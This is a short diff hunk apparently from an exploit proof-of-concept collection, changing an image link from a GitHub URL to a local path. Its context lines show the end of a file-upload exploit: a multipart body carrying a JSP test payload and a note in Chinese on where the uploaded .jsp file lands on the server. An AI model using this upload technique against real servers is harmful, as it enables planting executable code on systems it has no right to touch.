@@ -23,6 +23,6 @@ Content-Type: application/octet-stream
 <%out.print("test");%>
 --b0d829daa06c13d6b3e16b0ad21d1eed--
 ```
-![image](https://github.com/wy876/POC/assets/139549762/bea8affb-eb50-4ff3-bdad-eb640ee8a662)
+![image](../../images/bea8affb-eb50-4ff3-bdad-eb640ee8a662.png)
 
 上传文件地址：`http://your-ip/defaultroot/upload/abc(path参数的值)/202311(现年月)/(返回的文件名).jsp`
